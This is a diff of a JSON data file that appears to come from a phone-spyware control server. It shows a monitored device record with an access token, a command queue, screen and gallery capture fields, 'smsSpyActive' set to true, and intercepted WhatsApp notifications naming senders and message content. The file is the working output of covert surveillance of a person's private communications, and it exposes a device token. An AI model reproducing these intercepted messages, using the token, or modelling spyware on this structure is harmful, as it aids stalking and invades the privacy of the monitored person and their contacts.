@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776956452645,
+    "lastSeen": 1776956461936,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎71 pesan dari 41 chat",
+        "time": "23/04 23:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776956464653
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776956453966
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776956453915
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "23/04 20:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1776947534209
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎75 pesan dari 44 chat",
-        "time": "23/04 20:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776947508388
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Oi: BEW STORE",
-        "content": "Memberi reaksi 🕒 pada \".tt https://vt.tiktok.com/ZS9N5F2W1/\"",
-        "time": "23/04 20:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776947508058
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎66 pesan dari 43 chat",
-        "time": "23/04 20:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776947476054
       }
     ],
     "galleryPhotos": [],
